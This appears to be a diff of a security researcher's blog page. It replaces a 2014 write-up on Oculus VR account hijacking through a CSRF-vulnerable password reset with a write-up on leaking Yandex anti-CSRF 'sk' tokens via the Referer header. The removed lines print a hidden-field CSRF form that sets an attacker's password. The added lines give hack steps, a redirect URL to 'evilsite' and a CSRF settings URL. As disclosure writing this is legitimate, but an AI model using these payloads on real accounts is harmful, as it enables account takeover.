@@ -6,22 +6,22 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   
-  <title>OCULUS VR account hijacking via password reset vulnerability</title>
-  <meta name="description" content="Oculus VR is a virtual reality technology company founded by Brendan Iribe and Palmer Luckey. Their first product, still in development, is the Oculus Rift, ...">
+  <title>Bypass anti CSRF token of Yandex!</title>
+  <meta name="description" content="When you browse a link in docviewer.yandex.com, The site will recreate a token named `sk`, which is used to validate a redirection and anti-csrf token `sk` i...">
 
   <!-- CSS files -->
-  <link rel="stylesheet" href="/css/font-awesome.min.css">
-  <link rel="stylesheet" href="/css/main.css">
-  <link rel="stylesheet" href="/css/responsivediv.css">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+  <link rel="stylesheet" href="http://192.168.33.177:4000//css/main.css">
+  <link rel="stylesheet" href="http://192.168.33.177:4000//css/responsivediv.css">
 
-  <link rel="canonical" href="/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability">
-  <link rel="alternate" type="application/rss+xml" title="Blog BLog" href=" /feed.xml " />
+  <link rel="canonical" href="http://192.168.33.177:4000//articles/2014-05/leaking-anti-CSRF-token%20of-yandex!">
+  <link rel="alternate" type="application/rss+xml" title="Blog BLog" href="http://192.168.33.177:4000/ /feed.xml " />
 
   <!-- Icons -->
   <!-- 16x16 -->
-  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="shortcut icon" href="http://192.168.33.177:4000//favicon.ico">
   <!-- 32x32 -->
-  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="shortcut icon" href="http://192.168.33.177:4000//favicon.ico">
 
 </head>
 
@@ -30,30 +30,30 @@
   <div class="row">
     <div class="col s12 m3">
       <div class="table cover">
-        
+         
 
 <div class="cover-card table-cell table-middle">
   
-  <img src="/img/profile.jpg" alt="this is me!" class="avatar">
+  <img src="http://192.168.33.177:4000//img/profile.jpg" alt="this is me!" class="avatar">
   
-  <a href="/" class="author_name">Adrian Belen</a>
+  <a href="http://192.168.33.177:4000//" class="author_name">Adrian Belen</a>
   <span class="author_job">WEB APPLICATION SECURITY ENTHUSIAST, BREAKING THINGS FOR FUN & profit :D</span>
   <span class="author_bio mbm"></span>
   <nav class="nav">
     <ul class="nav-list">
        
       <li class="nav-item">
-        <a href="/about me ">about me</a>
+        <a href="http://192.168.33.177:4000//about me ">about me</a>
         <span>/</span>
       </li>
       
       <li class="nav-item">
-        <a href="/archive">archive</a>
+        <a href="http://192.168.33.177:4000//archive">archive</a>
         <span>/</span>
       </li>
       
       <li class="nav-item">
-        <a href="/categories">categories</a>
+        <a href="http://192.168.33.177:4000//categories">categories</a>
       </li>
      
     </ul>
@@ -61,14 +61,14 @@
   <div class="social-links">
   <ul>
     
-    <li><a href="http://twitter.com/nukesec" class="social-link-item" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></li>
+    <li><a href="http://twitter.com/nukesec" class="social-link-item" target="_blank"><i class="fab fa-twitter-square"></i></a></li>
     
     
     
     
     
     
-    <li><a href="http://github.com/deadstar1" class="social-link-item" target="_blank"><i class="fa fa-fw fa-github"></i></a></li>
+    <li><a href="http://github.com/deadstar1" class="social-link-item" target="_blank"><i class="fab fa-github"></i></a></li>
     
     
     
@@ -141,17 +141,17 @@
     <div class="col s12 m9">
       <div class="post-listing">
         <div class="back-home">
-  <a href="/">< back Home.</a>
+  <a href="http://192.168.33.177:4000//">< back Home.</a>
 </div>
 
 
 
 <div id="post">
   <header class="post-header">
-    <h1 title="OCULUS VR account hijacking via password reset vulnerability">OCULUS VR account hijacking via password reset vulnerability</h1>
+    <h1 title="Bypass anti CSRF token of Yandex!">Bypass anti CSRF token of Yandex!</h1>
     <span class="post-meta">
       <span class="post-date">
-        15 AUG 2014
+        7 MAY 2014
       </span>
       •
       <span class="read-time" title="Estimated read time">
@@ -166,46 +166,45 @@
   </header>
 
   <article class="post-content">
-    <p>Oculus VR is a virtual reality technology company founded by Brendan Iribe and Palmer Luckey. Their first product, still in development, is the Oculus Rift, a head-mounted display for immersive virtual reality(VR). In March 2014,Facebook agreed to acquire Oculus VR for US$2 billion in cash and Facebook stock.</p>
-
-<p>While testing the forgot password functionality of oculusVR. I have found that it’s possible to abuse this functionality.
-Here is a algorithm how the reset password functionality of oculus VR works.</p>
-
-<figure class="highlight"><pre><code class="language-text" data-lang="text">if (user is log in){
-//the app will not use auth parameter which is a reset password passcode. Then change the password of the user who is currently log in.
-
-}
-else{
-//if the user is not log in ,oculus uses the auth parameter to identify which account to be reset.
-
-}</code></pre></figure>
-
-<p><img src="https://4.bp.blogspot.com/-tAuAQSsCwO4/U_LD_b0AOnI/AAAAAAAAAQs/hotORflSwzY/s1600/check1.png" alt="passw" />
-<em>Although I am log in, password reset page still can be viewed.</em></p>
-
-<p>The main problem here is oculusVR does not have an ANTI-CSRF token on reset password functionality. :) the only need to hijack an oculusVR account is an attacker reset password link token. Combining the CSRF vulnerability and weird behavior of password reset page will be resulted in <strong>Account Hijacking vulnerability</strong>.</p>
-
-<h3 id="sample-csrf-poc">Sample CSRF PoC</h3>
-
-<figure class="highlight"><pre><code class="language-text" data-lang="text">&lt;body&gt;
-&lt;form action="https://developer.oculusvr.com/core/UserAction.php" method="POST"&gt;
-&lt;input type="hidden" name="action" value="changepassword" /&gt;
-&lt;input type="hidden" name="auth" value="your_reset_token" /&gt;
-&lt;input type="hidden" name="newpassword" value="attackerpassword" /&gt;
-&lt;input type="hidden" name="confirmpassword" value="attackerpassword" /&gt;
-&lt;input type="submit" value="Submit request" /&gt;
-&lt;/form&gt;
-&lt;/body&gt;</code></pre></figure>
-
-<p>To get the value of auth parameter you must request a reset password link on this link https://developer.oculusvr.com/lostpassword.</p>
+    <p>When you browse a link in docviewer.yandex.com, The site will recreate a token named sk, which is used to validate a redirection and anti-csrf token. sk is also an anti-CSRF token on <code>http://webmaster.yandex.ru, https://docviewer.yandex.com/r.xml</code>. now If the attacker knows the value of your sk token, he can make a redirection and CSRF attack. How to know the token of the victim ???. Because <code>http://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;url=evilsite</code> useD GET request, the params are showed in URL and it also changeable to https to HTTP. as a result, you can use REFERER HEADER to get the token.</p>
 
 <h3 id="hack-steps">HACK STEPS</h3>
 <ul>
-  <li>Attacker requests a reset password link</li>
-  <li>Makes a CSRF PoC attack with reset token</li>
-  <li>Sends the CSRF PoC link to his victim</li>
-  <li>If the victim clicks that link his password will be changed!</li>
+  <li>Upload a document with link or a hyperlink. that hyperlink is the attacker’s site..</li>
+  <li>Select the file, Share the link using the share button then get the link</li>
+  <li>Browse that link, Then click the view button you will redirect to docviewer.yandex.com</li>
+  <li>Change the https to http to allow us to see the referer in our site.</li>
 </ul>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;name=testxxx.odt to http://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;name=testxxx.odt</code></pre></div>
+
+<ul>
+  <li>Send the url to victim and induce him to click the link for attacker’site to able to leak the anti-CSRF token.</li>
+</ul>
+
+<p>now you have his <code>sk</code> token! that is the bypass!</p>
+
+<p><strong>for redirection</strong></p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">https://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;url=evilsite</code></pre></div>
+
+<p><strong>for csrf</strong> →</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">http://webmaster.yandex.com/settings/messages/types.xml?email_1=EMAIL&amp;email_2=EMAIL&amp;message_3=MESSAGE&amp;email_3=EMAIL&amp;message_4=MESSAGE&amp;percent=50&amp;message_5=MESSAGE&amp;message_6=MESSAGE&amp;message_7=MESSAGE&amp;message_8=MESSAGE&amp;email_8=EMAIL&amp;message_9=MESSAGE&amp;message_10=MESSAGE&amp;message_12=MESSAGE&amp;message_17=MESSAGE&amp;message_18=MESSAGE&amp;message_19=MESSAGE&amp;email_19=EMAIL&amp;message_21=MESSAGE&amp;email_21=EMAIL&amp;message_22=MESSAGE&amp;email_22=EMAIL&amp;message_32=MESSAGE&amp;do=save&amp;sk=TOKENOFVICTIM</code></pre></div>
+
+<p><strong>This is wide CSRF attack which affect other Yandex domain.</strong></p>
+
+<h3 id="list-of-affected-yandex-domain">list of affected Yandex domain</h3>
+
+<ul>
+  <li>http://appmetrica.yandex.com/</li>
+  <li>https://calendar.yandex.ru</li>
+  <li>https://disk.yandex.com/</li>
+  <li>docviewer.yandex.com</li>
+  <li>m.contact.yandex.com.tr &amp; etc</li>
+</ul>
+
+<p><em>NOTE: i used javascript code to get the leaked csrf token on refrerer header and append it to my CSRF PoC.</em></p>
 
   </article>
 </div>
@@ -214,19 +213,19 @@ else{
   <h6>Share on: </h6>
   <ul>
     <li>
-      <a href='https://twitter.com/intent/tweet?text=http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability @nukesec' class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+      <a href='https://twitter.com/intent/tweet?text=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token%20of-yandex! @nukesec' class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
     </li>
     <li>
-      <a href="https://www.facebook.com/sharer/sharer.php?u=http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability @nukesec'" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token%20of-yandex! @nukesec'" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
     </li>
     <li>
-      <a href="https://plus.google.com/share?url=http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+      <a href="https://plus.google.com/share?url=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token%20of-yandex!" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
     </li>
     <li>
-      <a href="https://news.ycombinator.com/submitlink?u=http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+      <a href="https://news.ycombinator.com/submitlink?u=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token%20of-yandex!" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
     </li>
     <li>
-      <a href="https://www.reddit.com/submit?url=http://maradrianbelen.com/articles/2014-08/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+      <a href="https://www.reddit.com/submit?url=http://maradrianbelen.com/articles/2014-05/leaking-anti-CSRF-token%20of-yandex!" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
     </li>
   </ul>
 </div><!-- end share-buttons -->
@@ -249,14 +248,14 @@ else{
 
 
         <footer>
-  &copy; 2016 Adrian Belen. Powered by <a href="http://jekyllrb.com/">Jekyll</a>,  made with <i class="fa fa-heart heart-icon"></i>
+  &copy; 2019 Adrian Belen. Powered by <a href="http://jekyllrb.com/">Jekyll</a>,  made with <i class="fa fa-heart heart-icon"></i>
 </footer>
 
       </div>
     </div>
   </div>
-  <script type="text/javascript" src="/js/jquery-2.1.4.min.js"></script>
-<script type="text/javascript" src="/js/main.js"></script>
+  <script type="text/javascript" src="http://192.168.33.177:4000//js/jquery-2.1.4.min.js"></script>
+<script type="text/javascript" src="http://192.168.33.177:4000//js/main.js"></script>
 <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/3.1.1/anchor.min.js"></script>
 
 <!-- Asynchronous Google Analytics snippet -->
@@ -283,7 +282,7 @@ else{
     var motos = [
     //"In the end, people will judege you anyway, so don't live your life impressing others - live your life impressing yourself",
     //"Live life to express, not to impress",
-    "<b>Success</b> is the ability to go from one failure to another with no loss of enthusiasm. </br> -Sir Winston Churchill"
+    "<b>Success</b> is the ability to go from one failure to another with no loss of enthusiasm."
     //"<b>IF</b> no mistake have you made, yet losing you are... a different game you should play </br> - Master Yoda"
     //"<b>No free quote for the day!</b>",
     //"Your dream doesn't have an expiration date. Take a deep breath, and try again.",
@@ -291,7 +290,7 @@ else{
     ];
     var len =motos.length
     var x = Math.floor((Math.random() * len ) + 1);
-    document.getElementsByClassName('author_bio')[0].innerHTML='"'+motos[x-1] + '"';
+    document.getElementsByClassName('author_bio')[0].innerHTML='"'+motos[x-1] + '" </br> -Sir Winston Churchill';
     console.log('selected moto:' + motos[x-1]);
     console.log('moto count: ' + motos.length );
     console.log('random ' + x-1)
